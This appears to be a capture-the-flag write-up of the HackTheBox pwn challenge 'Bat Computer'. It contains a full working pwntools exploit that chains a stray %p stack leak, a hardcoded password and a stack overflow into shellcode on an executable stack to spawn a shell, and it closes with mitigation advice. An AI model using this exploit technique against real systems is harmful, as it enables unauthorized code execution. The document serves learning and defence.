---
title: "Bat Computer"
date: 2027-05-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, shellcode, executable-stack, format-string, aslr, pwntools]
description: "An Easy Pwn challenge: a menu program leaks its own input-buffer address through a stray %p, then read()s past the buffer onto an executable stack. Drop shellcode, return into it, root shell."
---

## Overview

**Bat Computer** is an Easy HackTheBox **Pwn** challenge. You get `batcomputer` — a 64-bit PIE
binary with **no stack canary** and an **executable stack** (`GNU_STACK = RWE`). It hands you the
address of its own input buffer for free through a stray format specifier, gates a
[buffer overflow](https://cwe.mitre.org/data/definitions/121.html) behind a hardcoded password, and
then reads far more bytes than the buffer holds. The path: leak the buffer address → write shellcode
into the buffer → overwrite the saved return address with that leaked address → return straight into
your shellcode.

## The technique

Three things line up:

1. **A free stack leak.** Menu option `1` prints `It was very hard, but Alfred managed to locate
   him: %p` — but `printf` is called with **no argument** for that `%p`. This is a
   [format-string](https://cwe.mitre.org/data/definitions/134.html) bug: on x86-64 the first
   variadic value comes from `rsi`, and the compiler had just loaded `rsi = buf+0x14` while staging
   the string. So `%p` prints the exact address `read()` will later write to — ASLR on the stack is
   defeated, the binary just tells you where its buffer lives.

2. **A password that is only a `strcmp`.** Menu option `2` does `scanf("%15s")` then
   `strcmp(pw, "b4tp@$$w0rd!")`. The password is a literal sitting in the binary; `strings` reveals
   it.

3. **An over-long read onto an executable stack.** On the correct password the binary runs
   `read(0, buf+0x14, 0x89)` — 137 bytes into ~76 bytes of space. Because the stack pages are `rwx`,
   shellcode placed in that buffer is directly runnable. Overwrite the saved return address (offset
   **84**) with the leaked buffer address and execution jumps into the shellcode.

## Solution

`checksec` / `readelf -l` confirm the setup — no canary, and `GNU_STACK` carries the `E` (execute)
flag:

```bash
readelf -l batcomputer | grep -A1 GNU_STACK   # ... RWE  -> executable stack
```

The whole exploit is the `solve.py` below. Two gotchas make it more than a textbook overflow, and
both are commented inline:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('batcomputer', checksec=False)
context.arch = 'amd64'

io = remote(sys.argv[1], int(sys.argv[2]))

# --- stage 1: free stack leak via the argless %p (menu option 1) ---
io.sendlineafter(b'> ', b'1')
io.recvuntil(b'locate him: ')
leak = int(io.recvline().strip(), 16)      # = buf+0x14 = where read() writes our shellcode
log.success(f'shellcode addr: {hex(leak)}')

# --- stage 2: pass the strcmp gate, then overflow the RWX stack (menu option 2) ---
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'password: ', b'b4tp@$$w0rd!')
io.recvuntil(b'navigation commands: ')

# rsp lands only ~0x5c above the shellcode, so the execve stub's own pushes would
# grow the stack DOWN into the not-yet-run shellcode and corrupt it. Bump rsp up first.
sc = asm('add rsp, 0x200') + asm(shellcraft.amd64.linux.sh())
payload = sc.ljust(0x54, b'\x90') + p64(leak)   # offset 84 -> saved RIP = leaked buffer
io.send(payload)
io.recvuntil(b'Roger that!')

# The read() path loops back to the menu instead of returning. main only executes its
# leave;ret (consuming our overwritten RIP) via the "Too bad" branch: a choice that is
# neither 1 nor 2. Send 3 to trigger the return into our shellcode.
io.sendlineafter(b'> ', b'3')

io.interactive()
```

Run it against the live target and read the flag from the spawned shell:

```bash
python3 solve.py <target-ip> <target-port>
# ... shell ...
$ cat flag.txt
HTB{...}
```

Flag value redacted.

## Why it worked

The binary was compiled with an [executable stack](https://cwe.mitre.org/data/definitions/121.html)
and no canary, so attacker-controlled bytes in a stack buffer become directly executable code, and
nothing detects the saved-return-address overwrite. The stray `%p` removed the only remaining
obstacle — ASLR — by leaking the buffer's runtime address. The two subtleties are worth keeping:

- **The overflow doesn't return where you write it.** After `read()` the code prints "Roger that!"
  and jumps back to the menu — it never returns from that path. `main` only reaches its `leave; ret`
  through a separate menu branch, so triggering the hijack means choosing the dead-end option
  afterward. Always trace where the function actually *returns*, not just where it overflows.
- **Shellcode can clobber itself.** After the return, `rsp` sits just above the shellcode. An
  `execve` stub `push`es its `"/bin/sh"` string, and the stack grows *down* — straight into the
  shellcode bytes it hasn't executed yet. A single `add rsp, 0x200` prepended to the shellcode moves
  the stack far enough away that the pushes never reach it.

## Fix / defense

- **Never mark the stack executable.** Drop `-z execstack`; let NX enforce W^X so stack bytes can't
  run as code — the overflow then can't reach shellcode at all.
- **Bound the read** to the buffer size (`read(0, buf, sizeof(buf))`), not a hardcoded `0x89` that
  overruns it.
- **Compile with a stack canary** (`-fstack-protector-strong`) so a saved-return-address overwrite
  is detected and aborts.
- **Don't `printf` a format string with mismatched arguments** — a `%p` with no argument leaks a
  register.
- A password compiled into the binary is not a secret; gate on real authentication, not a `strcmp`
  to a literal.
